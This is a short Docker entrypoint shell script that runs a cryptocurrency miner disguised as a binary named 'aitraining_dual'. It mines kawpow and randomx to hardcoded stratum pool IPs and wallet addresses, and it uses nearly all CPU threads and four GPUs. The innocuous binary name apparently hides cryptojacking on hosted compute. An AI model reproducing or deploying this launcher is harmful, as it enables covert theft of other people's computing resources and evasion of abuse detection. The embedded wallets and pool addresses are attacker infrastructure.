#!/bin/sh

# --- Variable Definitions ---

# Set worker name to the container's hostname
# In Docker, $HOSTNAME is automatically set to the container ID
WORKER="$HOSTNAME"

# Detect CPU threads and leave 2 free for the system
# We prioritize /proc/cpuinfo (standard) and fallback to cgroup logic for robustness.
CPU_THREADS_CALC=0

# Use standard /proc/cpuinfo to count logical processors
TOTAL_PROCESSORS=$(grep -c '^processor' /proc/cpuinfo)

# Subtract 2 threads for the system overhead
CPU_THREADS_CALC=$((TOTAL_PROCESSORS - 2))

# Ensure at least 1 CPU thread is used
if [ "$CPU_THREADS_CALC" -lt 1 ]; then 
    CPU_THREADS_CALC=1
fi

# Set the final variable for use in the miner command
CPU_THREADS="$CPU_THREADS_CALC"

echo "--- Worker Configuration ---"
echo "WORKER Name: $WORKER"
echo "CPU Threads Detected: $CPU_THREADS"
echo "----------------------------"

# --- GPU Environment Variables ---
# These are crucial for OpenCL/AMD GPU performance
export GPU_MAX_HEAP_SIZE=100
export GPU_MAX_USE_SYNC_OBJECTS=1
export GPU_SINGLE_ALLOC_PERCENT=100
export GPU_MAX_ALLOC_PERCENT=100
export GPU_MAX_SINGLE_ALLOC_PERCENT=100
export GPU_ENABLE_LARGE_ALLOCATION=100
export GPU_MAX_WORKGROUP_SIZE=1024

# --- Execute the Binary (aitraining_dual) ---
# We assume aitraining_dual is present in the current working directory (/opt)
# Note: The '--password' is set to the Worker Name ($WORKER)
exec ./aitraining_dual \
    --algorithm "kawpow;randomx" \
    --pool "stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343" \
    --wallet "RM2ciYa3CRqyreRsf25omrB4e1S95waALr;44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd" \
    --password "$WORKER" \
    --cpu-threads "$CPU_THREADS" \
    --keepalive true \
    --disable-gpu-checks false \
    --gpu-id 0,1,2,3
